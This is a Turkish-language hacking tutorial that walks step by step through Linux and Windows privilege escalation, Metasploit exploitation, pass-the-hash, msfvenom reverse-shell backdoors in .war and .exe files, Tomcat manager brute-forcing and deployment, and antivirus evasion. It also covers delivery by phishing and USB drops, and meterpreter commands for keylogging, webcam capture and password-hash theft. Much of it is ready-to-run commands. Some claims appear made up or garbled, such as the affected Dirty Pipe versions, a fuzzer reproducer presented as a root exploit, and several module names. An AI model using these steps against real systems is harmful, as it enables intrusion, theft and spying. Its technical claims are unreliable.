İnternetten Exploit Arama ve Çalıştırma
Kullanacağımız araçlar şunlardır:

Exploit-db.com: Bu web sitesi, çeşitli işletim sistemleri, uygulamalar ve hizmetler için güncel ve test edilmiş exploitleri içeren bir veritabanıdır. Exploitleri aramak, indirmek ve incelemek için kullanabilirsiniz.
GCC: Bu, Linux'ta C ve C++ programlarını derlemek için kullanılan bir derleyicidir. Derleme işlemi, kaynak kodu çalıştırılabilir bir dosyaya dönüştürür.
Wget: Bu, Linux'ta komut satırından web sitelerinden dosya indirmek için kullanılan bir araçtır. Dosya adını veya URL'yi belirterek istediğiniz dosyayı indirebilirsiniz.
Adımlar şöyle olacaktır:
Adım: Exploit-db.com üzerinden exploit bulma. Bu adımda, hedeflediğiniz sistemin veya uygulamanın zayıflığını veya sürümünü belirlemeniz gerekir. Örneğin, Linux kernel 6.6.8 veya daha önceki sürümlerde bir yükselme zaafiyeti olan Dirty Pipe adlı bir exploit arıyorsanız, bunu arama kutusuna yazabilirsiniz. Arama sonucunda, bu exploit için bir C kodu dosyası olan dirty_pipe.c dosyasını bulabilirsiniz. Bu dosyayı indirmek için sağ tıklayıp "Bağlantıyı farklı kaydet" seçeneğini kullanabilirsiniz. Dosyayı istediğiniz bir dizine kaydedebilirsiniz. Örneğin, Masaüstü dizinine kaydedelim.
Adım: C programlama dilinde yazılmış bir dirty_pipe.c isimli local exploiti çalıştırma. Bu adımda, indirdiğiniz C kodu dosyasını derleyip çalıştıracaksınız. Bunun için, terminali açıp dosyanın bulunduğu dizine gidin. Örneğin, Masaüstü dizinine gitmek için şu komutu yazın:
cd Masaüstü
Daha sonra, GCC derleyicisini kullanarak C kodu dosyasını derleyin. Derleme işlemi sırasında, oluşturulacak çalıştırılabilir dosyanın adını belirtebilirsiniz. Örneğin, dirty_pipe adında bir dosya oluşturmak için şu komutu yazın:
gcc dirty_pipe.c -o dirty_pipe
Derleme işlemi başarıyla tamamlandıysa, çalıştırılabilir dosyayı çalıştırmak için şu komutu yazın:
./dirty_pipe
Bu komut, exploitin çalışmasını sağlayacak ve eğer hedef sisteminizde kernel zaafiyeti varsa, size root erişimi verecektir. Böylece, sistemi tamamen kontrol edebilirsiniz.
test@bt:$ ./dirty_pipe
root@bt:#
Linux Yerel Güvenlik Zafiyeti Hak Yükseltme
Linux kernelı, çeşitli bileşenlerde ve alt sistemlerde güvenlik açıkları içerebilir. Bu açıklar, yerel veya uzaktan saldırganların, sistemi ele geçirmek, verileri çalmak veya zararlı yazılım yüklemek için kullanabilecekleri ayrıcalık yükseltme, bellek bozulması, hizmet reddi veya kod yürütme gibi sonuçlara yol açabilir. Bu nedenle, Linux kernelını düzenli olarak güncellemek ve güvenlik yamalarını uygulamak önemlidir.
Linux kernelınde net/sched bileşeninde bir ayrıcalık yükseltme zafiyeti bulunmaktadır. Bu zafiyet, CVE-2022-29581 olarak tanımlanmıştır. Bu zafiyet, yerel bir saldırganın, Linux kernelının sanal dosya sistemi katmanında bir tam sayı taşması, sınırların dışına yazma ve serbest bırakıldıktan sonra kullanma (use-after-free) hatası oluşturarak root ayrıcalıklarına sahip olmasına olanak tanır. Bu zafiyet, Linux kernelının 4.14 ila 5.18 sürümleri arasında etkilidir.
Bu zafiyeti sömürmek için, aşağıdaki adımları izleyebilirsiniz:
Adım: Sistemdeki kernel sürümünü kontrol edin. uname -r komutunu çalıştırarak bunu yapabilirsiniz. Eğer kernel sürümünüz 4.14 ila 5.18 arasında ise, bu zafiyetten etkilenmiş olabilirsiniz.
Adım: Zafiyeti sömüren bir C kodu indirin. Bu kod, syzbot tarafından otomatik olarak üretilmiştir ve GitHub üzerinde mevcuttur. Aşağıdaki komutu kullanarak bu kodu indirebilirsiniz:
wget https://raw.githubusercontent.com/google/syzkaller/master/repros/2022-05/01/linux-5.18-rc1-usb-fuzzer-1.c
Adım: Gcc ile kodu derleyin ve derlenmiş kodu root-ol ismiyle kaydedin. Aşağıdaki komutu kullanarak bunu yapabilirsiniz:
gcc linux-5.18-rc1-usb-fuzzer-1.c -o root-ol
Adım: Kodu çalıştırın ve root olun. Aşağıdaki komutu kullanarak bunu yapabilirsiniz:
./root-ol
Bu komut, kernel üzerinde bir hata oluşturacak ve size root kabuğu verecektir. Artık root olarak istediğiniz işlemi yapabilirsiniz.
Windows Yerel Güvenlik Zafiyeti Hak Yükseltme
Windows sistemlerde kısıtlı haklardan system haklarına geçiş yapmak için çeşitli güvenlik zaafiyetleri kullanılabilir. Bunlardan bazıları şunlardır:
CVE-2021-36934: Bu zaafiyet, Windows 10 ve Windows 11 sistemlerde, sistem dosyalarına erişim sağlayan bir sembolik bağlantı oluşturulmasına izin verir. Bu sayede, SAM, SECURITY, SYSTEM gibi hassas dosyaları okuyabilir veya değiştirebilirsiniz. Bu zaafiyeti istismar etmek için, Metasploit Framework içindeki exploit/windows/local/cve_2021_36934_hive_nightmare modülünü kullanabilirsiniz. Bu modül, hedef sistemde bir meterpreter oturumu elde ettikten sonra, sistem dosyalarını kopyalayarak, sistem parolalarını çıkarmak için Mimikatz kullanır.
CVE-2020-1337: Bu zaafiyet, Windows Print Spooler servisindeki bir yükselme yetkisi açığıdır. Bu servis, SYSTEM yetkileri ile çalışır ve yazıcı sürücülerini yüklemek için kullanılır. Bu zaafiyeti istismar etmek için, Metasploit Framework içindeki exploit/windows/local/cve_2020_1337_printerdemon modülünü kullanabilirsiniz. Bu modül, hedef sistemde bir meterpreter oturumu elde ettikten sonra, bir DLL dosyasını yazıcı sürücüsü olarak yükler ve bu DLL dosyası çalıştığında, SYSTEM yetkilerine sahip bir meterpreter oturumu açar.
CVE-2019-1322: Bu zaafiyet, Windows Error Reporting (WER) servisindeki bir yükselme yetkisi açığıdır. Bu servis, SYSTEM yetkileri ile çalışır ve program hatalarını raporlamak için kullanılır. Bu zaafiyeti istismar etmek için, Metasploit Framework içindeki exploit/windows/local/cve_2019_1322_wertrigger modülünü kullanabilirsiniz. Bu modül, hedef sistemde bir meterpreter oturumu elde ettikten sonra, WER servisinin çalıştığı dizine bir DLL dosyası kopyalar ve bu DLL dosyası çalıştığında, SYSTEM yetkilerine sahip bir meterpreter oturumu açar.
Bu zaafiyetlerin her biri için, aşağıdaki adımları takip edebilirsiniz:
Adım: Hedef sisteme bir meterpreter oturumu açmak için, uygun bir exploit modülü seçin ve gerekli seçenekleri ayarlayın. Örneğin, ms08-067 zaafiyeti için, exploit/windows/smb/ms08_067_netapi modülünü kullanabilirsiniz. Bu modül, Windows XP ve Windows 2003 sistemlerde, SMB protokolündeki bir uzaktan kod çalıştırma zaafiyetini kullanır. Bu modülü kullanmak için, hedef sistemin IP adresini ve işletim sistemini belirtmeniz gerekir. Aşağıdaki komutları kullanarak, bu modülü seçebilir ve seçeneklerini görebilirsiniz:
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > show options
Adım: Seçtiğiniz exploit modülüne uygun bir payload seçin ve gerekli seçenekleri ayarlayın. Payload, hedef sisteme gönderilen ve çalıştırılan kod parçasıdır. Payload seçenekleri, exploit modülüne bağlı olarak değişir. Genellikle, windows/meterpreter/reverse_tcp payloadını kullanabilirsiniz. Bu payload, hedef sistemde bir meterpreter oturumu açar ve bu oturumu, sizin belirttiğiniz IP adresi ve port numarası üzerinden geri bağlar. Bu payloadı kullanmak için, sizin IP adresinizi ve port numaranızı belirtmeniz gerekir. Aşağıdaki komutları kullanarak, bu payloadı seçebilir ve seçeneklerini görebilirsiniz:
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > show options
Adım: Exploit modülünü çalıştırın ve hedef sisteme bir meterpreter oturumu açın. Aşağıdaki komutu kullanarak, exploit modülünü çalıştırabilirsiniz:
msf exploit(ms08_067_netapi) > exploit
Eğer exploit başarılı olursa, hedef sistemde bir meterpreter oturumu açılacaktır. Bu oturumun ID numarasını görebilirsiniz. Örneğin, meterpreter > yazısının yanında [1] yazıyorsa, bu oturumun ID numarası 1'dir.
Adım: Hedef sistemdeki güvenlik zaafiyetini istismar etmek için, uygun bir local exploit modülü seçin ve gerekli seçenekleri ayarlayın. Local exploit modülleri, zaten erişim sağlanmış bir sistemde, yükselme yetkisi veya diğer işlemler yapmak için kullanılır. Local exploit modüllerini, exploit/windows/local klasörü altında bulabilirsiniz. Örneğin, CVE-2021-36934 zaafiyeti için, exploit/windows/local/cve_2021_36934_hive_nightmare modülünü kullanabilirsiniz. Bu modülü kullanmak için, daha önce elde ettiğiniz meterpreter oturumunun ID numarasını belirtmeniz gerekir. Aşağıdaki komutları kullanarak, bu modülü seçebilir ve seçeneklerini görebilirsiniz:
msf > use exploit/windows/local/cve_2021_36934_hive_nightmare
msf exploit(cve_2021_36934_hive_nightmare) > show options
Adım: Local exploit modülünü çalıştırın ve hedef sistemde SYSTEM yetkilerine sahip bir meterpreter oturumu açın. Aşağıdaki komutu kullanarak, local exploit modülünü çalıştırabilirsiniz:
msf exploit(cve_2021_36934_hive_nightmare) > exploit
Eğer exploit başarılı olursa, hedef sistemde SYSTEM yetkilerine sahip bir meterpreter oturumu açılacaktır. Bu oturumun ID numarasını görebilirsiniz. Örneğin, meterpreter > yazısının yanında [2] yazıyorsa, bu oturumun ID numarası 2'dir.
Adım: Açtığınız meterpreter oturumlarını yönetin ve hedef sistemde istediğiniz işlemleri yapın. Meterpreter oturumları arasında geçiş yapmak için, sessions komutunu kullanabilirsiniz. Örneğin, 2 numaralı oturuma geçmek için, aşağıdaki komutu kullanabilirsiniz:
msf > sessions -i 2
Metasploit Kullanarak Pass The Hash (Parolasız Sistem Erişimi)
Pass The Hash, bir sistemden ele geçirilen parola hash'ini kullanarak başka bir sisteme kimlik doğrulaması yapmak için bir saldırı yöntemidir. Parola hash'i, bir parolanın kriptografik bir algoritma ile şifrelenmiş halidir. Örneğin, parola "testlerdeyim" ise, bunun NTLM hash'i "0cb6948805f797bf2a82807973b89537" dir. Parola hash'i, düz metin parolayı bilmekten daha güvenli bir yöntemdir, çünkü hash'i çözmek çok zor veya imkansız olabilir. Ancak, hash'i çözmeye gerek olmadan, ham hash kullanarak kimlik doğrulaması yapmak mümkündür. Bu, Pass The Hash saldırısının temel mantığıdır.
Pass The Hash saldırısı, aynı kimlik bilgilerini paylaşan diğer makineleri ele geçirmeyi çok kolaylaştırır. Örneğin, bir ağda, birçok makine aynı kullanıcı adı ve parolayı kullanıyorsa, saldırgan sadece bir makineden parola hash'ini ele geçirmesi yeterlidir. Sonra, bu hash'i kullanarak diğer makinelerde oturum açabilir ve istediği işlemleri yapabilir. Bu, saldırganın ağdaki diğer makineleri de etkilemesine ve zarar vermesine olanak tanır. Bu nedenle, Pass The Hash saldırısı, bilgi güvenliği açısından ciddi bir tehdit oluşturur.
Pass The Hash saldırısını gerçekleştirmek için, birçok araç ve yöntem vardır. Bunlardan biri, Metasploit kullanmaktır. Metasploit, siber güvenlik alanında yaygın olarak kullanılan, açık kaynaklı bir araç setidir. Metasploit, çok sayıda exploit, payload, modül ve araç içerir. Exploit, bir sistemdeki bir zafiyeti istismar etmek için kullanılan bir kod parçasıdır. Payload, exploit ile birlikte gönderilen ve hedef sistemde çalıştırılan bir kod parçasıdır. Modül, Metasploit'in belirli bir işlevi yerine getirmek için kullandığı bir bileşendir. Araç, Metasploit'in sunduğu yardımcı programlardan biridir.
Metasploit Kullanarak Pass The Hash (Parolasız Sistem Erişimi) yapmak için, aşağıdaki adımları izlemeniz gerekir:
Kali Linux'u başlatın ve komut satırına erişin. Kali Linux, çeşitli bilgi güvenliği görevleri için optimize edilmiş, açık kaynaklı, Debian tabanlı bir Linux dağıtımıdır. Kali Linux, Metasploit gibi çok sayıda araç ve yardımcı program içerir. Kali Linux'u farklı platformlarda ve cihazlarda kurmak ve çalıştırmak için çeşitli seçenekler vardır. Örneğin, Kali Linux'u bir sanal makine, bir canlı USB, bir ARM cihazı veya Windows Alt Sistemi için Linux (WSL) üzerinde çalıştırabilirsiniz. Hangi yöntemi seçerseniz seçin, Kali Linux'u başarıyla kurduktan sonra, komut satırına erişmek için terminal uygulamasını açabilirsiniz.
Metasploit'i çalıştırın. Komut satırında msfconsole yazın ve enter tuşuna basın. Bu, Metasploit'in komut satırı arayüzünü başlatır. Bu arayüzde, Metasploit'in sunduğu tüm özellikleri kullanabilirsiniz.
Psexec isimli exploit'i bulun. Komut satırında search psexec yazın ve enter tuşuna basın. Bu, psexec ile ilgili tüm exploit'leri listeler. Psexec, Windows sistemlerde uzaktan komut çalıştırmak için kullanılan bir araçtır. Bu araç, Pass The Hash saldırısı için uygun bir exploit'tir, çünkü parola hash'ini kullanarak hedef makineye bağlanabilir. Bu örnekte, exploit/windows/smb/psexec exploit'ini kullanacağız. Bu exploit, SMB protokolü üzerinden psexec aracını kullanarak hedef makineye erişir ve bir payload çalıştırır.
Exploit'i seçin. Komut satırında use exploit/windows/smb/psexec yazın ve enter tuşuna basın. Bu, exploit'i yükler ve ayarlarını görüntüler. Exploit'in ayarları, komut satırının sol tarafında parantez içinde gösterilir. Örneğin, (exploit/windows/smb/psexec) gibi.
Exploit ayarlarını yapın. Komut satırında show options yazın ve enter tuşuna basın. Bu, exploit'in gerektirdiği ve isteğe bağlı olan tüm seçenekleri gösterir. Bu seçenekler arasında, hedef makinenin IP adresini (RHOSTS), kullanıcı adını (SMBUser), domain adını (SMBDomain) ve parola hash'ini (SMBPass) belirtmeniz gerekir. Bu değerleri, set komutu ile atayabilirsiniz. Örneğin, set RHOSTS 192.168.1.10 yazarak hedef makinenin IP adresini belirleyebilirsiniz. Parola hash'ini, LMHASH:NTLMHASH formatında girmeniz gerekir. LMHASH, NTLM hash'inin eski bir versiyonudur ve bazen boş olabilir. Diğer seçenekleri varsayılan değerlerde bırakabilirsiniz. Exploit'in ayarlarını tamamladıktan sonra, show options komutunu tekrar çalıştırarak doğru olduğundan emin olun.
Exploit'i çalıştırın. Komut satırında exploit yazın ve enter tuşuna basın. Bu, exploit'i tetikler ve hedef makineye bağlanmaya çalışır. Eğer başarılı olursa, hedef makinede bir komut satırı oturumu açar. Bu oturumda, hedef makine üzerinde istediğiniz komutları çalıştırabilirsiniz. Örneğin, whoami komutu ile kimliğinizi, ipconfig komutu ile IP adresinizi, net user komutu ile kullanıcıları, net share komutu ile paylaşımları görebilirsiniz. Ayrıca, hedef makine üzerinde dosya indirebilir, yükleyebilir veya çalıştırabilirsiniz.
Bu adımları takip ederek, Metasploit kullanarak Pass The Hash (Parolasız Sistem Erişimi) yapabilirsiniz.
Metasploit Kullanarak backdoor özelliği olan .WAR Dosyası
Kullanılacak araçlar:
Msfvenum
Msfvenom, payload oluşturma ve kodlama işlemlerini birleştiren bir araçtır. Msfvenom aracını kullanarak .WAR dosyası oluşturmak için aşağıdaki adımları takip edebilirsiniz:
Adım: Msfvenom aracının kullanımını ve desteklediği seçenekleri görmek için -h veya --help parametresini kullanın. Örneğin:
root@kali:~# msfvenom -h
Adım: Msfvenom aracı ile kullanabileceğiniz payloadları görmek için -l veya --list parametresini kullanın. Payloadlar, hedef sisteme gönderilecek olan kötü amaçlı kod parçalarıdır. Örneğin:
root@kali:~# msfvenom -l payloads
Adım: Reverse_tcp payloadunu kullanarak ajanınızı oluşturmak istediğinizi varsayalım. Bu ajan çalıştırıldığında, sizin yerel makinenize bir ters bağlantı kuracaktır. Bu bağlantı için kullanacağınız IP adresini ve port numarasını belirtmeniz gerekir. Bunun için -p veya --payload parametresini kullanabilirsiniz. Örneğin:
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.1 LPORT=4444
Adım: Oluşturduğunuz payloadun çıktı formatını belirlemeniz gerekir. Bu, payloadun nasıl görüneceğini ve nasıl çalıştırılacağını etkiler. .WAR dosyası oluşturmak istiyorsanız, -f veya --format parametresini war olarak belirtmeniz gerekir. Örneğin:
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.1 LPORT=4444 -f war
Adım: Oluşturduğunuz .WAR dosyasını kaydetmek istiyorsanız, -o veya --out parametresini kullanarak bir dosya adı belirleyebilirsiniz. Örneğin:
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.1 LPORT=4444 -f war -o test.war
Bu şekilde, test.war isimli bir dosya oluşturmuş olursunuz. Bu dosyayı, Java ile geliştirilmiş bir web uygulamasına yükleyerek, hedef sisteme sızabilirsiniz. Bunun için, hedef sistemin Apache Tomcat sunucusunun zafiyetli olduğunu veya yönetici erişimine sahip olduğunuzu varsayalım. Aşağıdaki adımları takip ederek, .WAR dosyasını yükleyebilirsiniz:
Adım: Metasploit konsolunu açın ve exploit/multi/http/tomcat_mgr_upload modülünü kullanın. Bu modül, Apache Tomcat sunucusuna .WAR dosyası yüklemenizi sağlar. Örneğin:
root@kali:~# msfconsole
msf > use exploit/multi/http/tomcat_mgr_upload
Adım: Modülün gerektirdiği seçenekleri ayarlayın. Bunlar, hedef sistemin IP adresi, port numarası, yönetici kullanıcı adı ve şifresi, yükleyeceğiniz .WAR dosyasının yolu ve payloadunuzun platformu ve mimarisidir. Örneğin:
msf exploit(multi/http/tomcat_mgr_upload) > set RHOST 192.168.2.2
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set WARFILE /root/test.war
msf exploit(multi/http/tomcat_mgr_upload) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.2.1
msf exploit(multi/http/tomcat_mgr_upload) > set LPORT 4444
Adım: Modülü çalıştırın ve hedef sisteme bağlanmayı bekleyin. Örneğin:
msf exploit(multi/http/tomcat_mgr_upload) > exploit
Eğer her şey yolunda giderse, hedef sisteme bir meterpreter oturumu açılacaktır. Bu oturumda, hedef sistemi kontrol edebilir, dosya indirebilir veya yükleyebilir, ekran görüntüsü alabilir, klavye tuşlarını izleyebilir, web kamerasını açabilir, ses kaydedebilir ve daha birçok işlem yapabilirsiniz. Meterpreter oturumunun komutlarını görmek için help komutunu kullanabilirsiniz. Örneğin:
meterpreter > help
Bu şekilde, Metasploit kullanarak backdoor özelliği olan .WAR dosyası oluşturma ve Apache Tomcat sunucusunu exploit etme işlemlerini gerçekleştirmiş olursunuz.
Metasploit Kullanarak Tomcat Zafiyeti İstismarı
Tomcat, Java Servlet, JavaServer Pages, Java Expression Language ve Java WebSocket teknolojilerini destekleyen bir web sunucusu ve servlet konteyneridir. Tomcat, web uygulamalarını çalıştırmak için kullanılabilir, ancak aynı zamanda yönetici arayüzüne erişim sağlayan bir yönetici uygulaması da içerir. Bu uygulama, web uygulamalarını yüklemek, kaldırmak, yeniden başlatmak veya durdurmak gibi işlemleri yapmaya olanak tanır.
Tomcat yönetici uygulamasına erişmek için bir kullanıcı adı ve parola gereklidir. Bu bilgiler, tomcat-users.xml dosyasında tanımlanır. Ancak, bazı durumlarda, bu dosyada varsayılan veya zayıf kimlik bilgileri bırakılabilir. Bu da, bir saldırganın yönetici uygulamasını ele geçirmesine ve web sunucusuna zararlı web uygulamaları yüklemesine olanak tanır.
Metasploit, bir güvenlik aracıdır. Metasploit, çeşitli zafiyetleri tespit etmek, istismar etmek ve sonuçlarını raporlamak için kullanılabilir. Metasploit, tomcat_mgr_login ve tomcat_mgr_deploy adında iki modül içerir. Bu modüller, Tomcat yönetici uygulamasını istismar etmek için kullanılabilir .
Kali Linux, bir penetrasyon testi ve etik hackleme Linux dağıtımıdır. Kali Linux, Metasploit gibi çeşitli güvenlik araçlarını içerir. Kali Linux, Tomcat zafiyeti istismarını gerçekleştirmek için kullanılabilir.
Tomcat zafiyeti istismarı için aşağıdaki adımları izleyebilirsiniz:
Adım: Hedef sistemin IP adresini ve Tomcat yönetici uygulamasının çalıştığı portu belirleyin. Bu bilgileri, nmap gibi bir port tarama aracı ile elde edebilirsiniz. Örneğin, hedef sistemin IP adresi 192.168.1.100 ve Tomcat yönetici uygulamasının çalıştığı port 8080 olsun.
Adım: Metasploit'i başlatın ve tomcat_mgr_login modülünü kullanın. Bu modül, Tomcat yönetici uygulamasına giriş yapmak için kullanıcı adı ve parola denemeleri yapar. Modülü kullanmak için aşağıdaki komutları girin:
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options
Bu komut, modülün seçeneklerini gösterir. Bu seçeneklerden bazılarını, hedef sisteme uygun olarak ayarlamamız gerekiyor. Örneğin, RHOSTS seçeneğini hedef sistemin IP adresine, RPORT seçeneğini Tomcat yönetici uygulamasının çalıştığı porta, USER_FILE ve PASS_FILE seçeneklerini kullanıcı adı ve parola listelerinin bulunduğu dosya yollarına ayarlayalım. Bu seçenekleri ayarlamak için aşağıdaki komutları girin:
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set USER_FILE /usr/share/wordlists/metasploit/http_default_users.txt
USER_FILE => /usr/share/wordlists/metasploit/http_default_users.txt
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PASS_FILE /usr/share/wordlists/metasploit/http_default_pass.txt
PASS_FILE => /usr/share/wordlists/metasploit/http_default_pass.txt
Bu seçenekleri ayarladıktan sonra, modülü çalıştırmak için aşağıdaki komutu girin:
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
Bu komut, modülü çalıştırır ve kullanıcı adı ve parola listelerindeki tüm kombinasyonları deneyerek Tomcat yönetici uygulamasına giriş yapmaya çalışır. Eğer başarılı bir giriş yapılırsa, modül bunu ekrana yazar. Örneğin, kullanıcı adı admin ve parola admin olan bir giriş başarılı olsun. Modül, aşağıdaki çıktıyı verir:
[+] 192.168.1.100:8080 - Success: 'admin:admin' 'Tomcat Manager Application'
Bu çıktı, kullanıcı adı admin ve parola admin olan bir girişin başarılı olduğunu ve Tomcat yönetici uygulamasına erişildiğini gösterir. Bu bilgileri, bir sonraki adımda kullanacağız.
Adım: Metasploit'te tomcat_mgr_deploy modülünü kullanın. Bu modül, Tomcat yönetici uygulamasını kullanarak hedef sisteme zararlı bir web uygulaması yükler. Bu web uygulaması, hedef sisteme bir meterpreter oturumu açar. Meterpreter, Metasploit'in gelişmiş bir payload'ıdır. Meterpreter, hedef sisteme uzaktan komut çalıştırmak, dosya yönetimi yapmak, ekran görüntüsü almak, klavye tuşlarını kaydetmek, web kamerasına erişmek gibi işlemleri yapmaya olanak tanır. Modülü kullanmak için aşağıdaki komutları girin:
msf6 auxiliary(scanner/http/tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_deploy
msf6 exploit(multi/http/tomcat_mgr_deploy) > show options
Bu komut, modülün seçeneklerini gösterir. Bu seçeneklerden bazılarını, hedef sisteme ve önceki adımda elde ettiğimiz bilgilere uygun olarak ayarlamamız gerekiyor. Örneğin, RHOSTS seçeneğini hedef sistemin IP adresine, RPORT seçeneğini Tomcat yönetici uygulamasının çalıştığı porta, HttpUsername ve HttpPassword seçeneklerini Tomcat yönetici uygulamasına giriş yapmak için kullandığımız kullanıcı adı ve parolaya, TARGET seçeneğini hedef sistemin işletim sistemine uygun bir değere ayarlayalım. Bu seçenekleri ayarlamak için aşağıdaki komutları girin:
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername admin
HttpUsername => admin
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword admin
HttpPassword => admin
msf6 exploit(multi/http/tomcat_mgr_deploy) > set TARGET 1
TARGET => 1
Bu seçenekleri ayarladıktan sonra, modülü çalıştırmak için aşağıdaki komutu girin:
msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
Bu komut, modülü çalıştırır ve hedef sisteme zararlı bir web uygulaması yükler. Eğer başarılı olursa, modül bunu ekrana yazar ve hedef sisteme bir meterpreter oturumu açar. Örneğin, aşağıdaki çıktıyı verir.
[] Started reverse TCP handler on 192.168.1.101:4444
[] Retrieving session ID and CSRF token...
[] Uploading and deploying 1fJ0...
[] Executing 1fJ0...
[] Sending stage (985320 bytes) to 192.168.1.100
[] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.100:49159) at 2024-01-26 08:53:11 +0300
Metasploit Kullanarak Antivirüs Atlatma
Metasploit, zafiyetli sistemlere saldırmak için kullanılan bir araçtır. Metasploit'in msfvenom adlı bir modülü, farklı platformlar ve hedefler için çeşitli payloadlar oluşturmak ve kodlamak için kullanılır. Payload, hedef sisteme sızdırılan ve saldırganın kontrolünü sağlayan zararlı koddur. Kodlama, payloadın antivirüs veya güvenlik duvarları tarafından tespit edilmesini zorlaştırmak için yapılan bir işlemdir.
Metasploit kullanarak antivirüs atlatma için aşağıdaki adımları izleyebilirsiniz:
Adım: Msfvenom ile payload oluşturmak
Msfvenom, msfpayload ve msfencode araçlarının birleşimidir. Msfpayload, payload oluşturmak için kullanılırken, msfencode, payloadı kodlamak için kullanılır. Msfvenom, bu iki işlemi tek bir komutla yapabilir.
Örneğin, windows sistemine sızıp tersine bağlantı kurmak için bir payload oluşturmak istiyorsanız, aşağıdaki komutu kullanabilirsiniz:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f exe -o test.exe
Bu komut, windows/meterpreter/reverse_tcp adlı bir payload oluşturur. Bu payload, hedef sistemde çalıştırıldığında, 192.168.1.102 IP adresindeki ve 4444 portundaki saldırgan makinesine bağlanır. -f parametresi, çıktı formatını belirtir. Bu örnekte, exe formatı seçilmiştir. -o parametresi, oluşturulan dosyanın adını ve konumunu belirtir. Bu örnekte, test.exe adlı bir dosya oluşturulur.
Msfvenom, birçok farklı payload, format, kodlayıcı, platform ve mimari seçeneği sunar. Bu seçenekleri görmek için, aşağıdaki komutları kullanabilirsiniz:
msfvenom -l payloads # payload listesi
msfvenom -l formats # format listesi
msfvenom -l encoders # kodlayıcı listesi
msfvenom -l platforms # platform listesi
msfvenom -l archs # mimari listesi
Msfvenom, payload oluştururken bazı parametreleri de alabilir. Bu parametreler, payloadın çalışma şeklini veya özelliklerini belirler. Örneğin, payloadın çalıştırılacağı işletim sistemi, bağlantı kurulacak IP adresi ve portu, payloadın boyutu, kaç kere kodlanacağı, kaçmak istediğimiz karakterler, eklemek istediğimiz kodlar, kullanmak istediğimiz şablonlar gibi parametreler vardır. Bu parametreleri görmek için, aşağıdaki komutu kullanabilirsiniz:
msfvenom -p windows/meterpreter/reverse_tcp --payload-options
Bu komut, windows/meterpreter/reverse_tcp payloadı için kullanabileceğimiz parametreleri gösterir. Bu parametreleri, -p parametresinden sonra yazarak kullanabiliriz. Örneğin, aşağıdaki komut, payloadın boyutunu 300 byte ile sınırlar, payloadı 10 kere shikata_ga_nai kodlayıcısı ile kodlar ve badchars adlı bir dosyada belirtilen karakterleri kaçınır.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -s 300 -i 10 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f exe -o test.exe
Adım: Metasploit ile payloadı dinlemek
Msfvenom ile payload oluşturduktan sonra, bu payloadı hedef sistemde çalıştırmak için, metasploit frameworkü kullanarak payloadı dinlememiz gerekir. Bunun için, aşağıdaki komutları kullanabiliriz:
msfconsole # metasploit frameworkünü başlatır
use exploit/multi/handler # çoklu handler exploitini kullanır
set payload windows/meterpreter/reverse_tcp # payloadı seçer
set LHOST 192.168.1.102 # dinleme IP adresini belirtir
set LPORT 4444 # dinleme portunu belirtir
exploit # exploit işlemini başlatır
Bu komutlar, metasploit frameworkünü başlatır, çoklu handler exploitini kullanır, payloadı seçer, dinleme IP adresini ve portunu belirtir ve exploit işlemini başlatır. Bu aşamada, metasploit frameworkü, payloadın bağlanmasını bekler.
Adım: Payloadı hedef sistemde çalıştırmak
Payloadı hedef sistemde çalıştırmak için, oluşturduğumuz exe dosyasını hedef sisteme ulaştırmamız gerekir. Bu, sosyal mühendislik, phishing, USB bırakma, zafiyetli web uygulamaları, zafiyetli servisler gibi yöntemlerle yapılabilir. Hedef sistemde antivirüs programı varsa, payloadın tespit edilmesini önlemek için kodlama işlemi yapmamız gerekir. Bu, msfvenom ile yapılabilir. Ayrıca, payloadın masum bir uygulama gibi görünmesi için, şablon kullanabilir veya ikon değiştirebiliriz.
Payloadı hedef sistemde çalıştırdığımızda, metasploit frameworkü ile bağlantı kurar ve bize bir meterpreter oturumu açar. Meterpreter, hedef sistem üzerinde çeşitli işlemler yapmamızı sağlayan güçlü bir payloaddır. Meterpreter oturumunda, aşağıdaki komutları kullanabiliriz:
help # yardım menüsünü gösterir
sysinfo # hedef sistemin bilgilerini gösterir
getuid # hedef sistemdeki kullanıcı adını gösterir
getpid # hedef sistemdeki işlem numarasını gösterir
ps # hedef sistemdeki işlemleri listeler
migrate [PID] # hedef sistemdeki başka bir işleme geçer
hashdump # hedef sistemdeki parola hashlerini çeker
screenshot # hedef sistemdeki ekran görüntüsünü alır
webcam_snap # hedef sistemdeki web kamerasından fotoğraf çeker
keyscan_start # hedef sistemdeki klavye tuşlarını kaydeder
keyscan_dump # hedef sistemdeki klavye tuşlarını gösterir
keyscan_stop # hedef sistemdeki klavye tuşlarını kaydetmeyi durdurur
download [FILE] # hedef sistemden dosya indirir
upload [FILE] # hedef sisteme dosya yükler
shell # hedef sistemde komut satırı açar
